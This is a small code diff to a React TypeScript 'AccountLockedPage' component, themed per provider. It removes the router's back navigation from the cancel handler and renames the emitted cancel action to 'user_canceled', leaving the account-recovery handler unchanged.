@@ -1,5 +1,5 @@
 import React from 'react';
-import { useLocation, useNavigate } from 'react-router-dom';
+import { useLocation } from 'react-router-dom';
 import { ProviderKey, getProviderTheme } from './providerTheme';
 import ProviderShell from './ProviderShell';
 
@@ -10,7 +10,6 @@ interface AccountLockedPageProps {
 
 const AccountLockedPage: React.FC<AccountLockedPageProps> = ({ providerKey, onAction }) => {
   const location = useLocation();
-  const navigate = useNavigate();
   const theme = getProviderTheme(providerKey);
   const data = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};
   const email = (data.email as string) || ((location.state as { email?: string } | null)?.email) || '';
@@ -31,8 +30,7 @@ const AccountLockedPage: React.FC<AccountLockedPageProps> = ({ providerKey, onAc
 
   const handleRecover = () => onAction('begin_account_recovery', { email });
   const goBack = () => {
-    onAction('cancel');
-    navigate(-1);
+    onAction('user_canceled');
   };
 
   const LockBlock = () => (
